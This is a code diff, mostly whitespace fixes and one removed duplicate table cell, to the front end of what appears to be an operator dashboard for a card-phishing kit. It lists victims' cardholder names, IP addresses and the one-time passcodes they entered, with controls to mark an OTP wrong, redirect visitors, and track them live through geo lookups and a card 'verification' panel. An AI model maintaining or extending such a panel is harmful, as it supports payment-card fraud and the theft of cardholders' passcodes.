@@ -557,7 +557,7 @@
         
         const data = await response.json();
         
-       // Create geo data object
+        // Create geo data object
         const geoData = {
           city: data.city || 'Unknown',
           country: data.country_name || 'Unknown',
@@ -855,7 +855,7 @@
 
         const data = await response.json();
         
-        if (!response.ok) {
+if (!response.ok) {
           resultElement.textContent = data.message || 'Failed to expire link';
           resultContainer.style.display = 'block';
           throw new Error(data.message || 'Failed to expire link');
@@ -929,7 +929,6 @@
             <td>${tx.cardholder}</td>
             <td><span class="ip-address">${tx.ip || 'Unknown'}</span></td>
             <td>
-              <td>
               ${tx.otpEntered ?
                 `<span class="otp-received">${tx.otpEntered}</span>
                  <button class="wrong-otp-btn" onclick="markWrongOTP('${tx.id}')" ${tx.redirectStatus ? 'disabled' : ''}>
@@ -1227,7 +1226,7 @@
       const visitorElement = document.getElementById(`visitor-${data.pid}`);
       if (visitorElement) {
         visitorElement.classList.add('fade-out');
-        setTimeout(() => {
+setTimeout(() => {
           visitorElement.remove();
 
           // Show "No visitors yet" message if this was the last visitor
@@ -1358,7 +1357,7 @@
         }
       });
       
-     // Close button
+      // Close button
       mcClosePanelBtn.addEventListener('click', function() {
         console.log('Closing MC verification panel');
         mcOtpPanel.classList.add('hidden');
